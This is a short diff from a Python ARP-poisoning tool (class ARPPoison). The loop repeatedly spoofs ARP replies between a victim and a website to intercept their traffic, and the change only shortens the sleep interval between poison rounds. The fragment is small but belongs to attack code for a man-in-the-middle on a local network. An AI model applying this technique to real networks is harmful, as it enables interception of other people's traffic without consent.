@@ -52,7 +52,7 @@ class ARPPoison:
             try:
                 self.poison(self.victimIP, self.websiteIP, self.victimMAC)
                 self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
-                time.sleep(31.0 - 3.0*timer)
+                time.sleep(10.5 - timer)
             except KeyboardInterrupt:
                 try:
                     self.ip_forward(False)
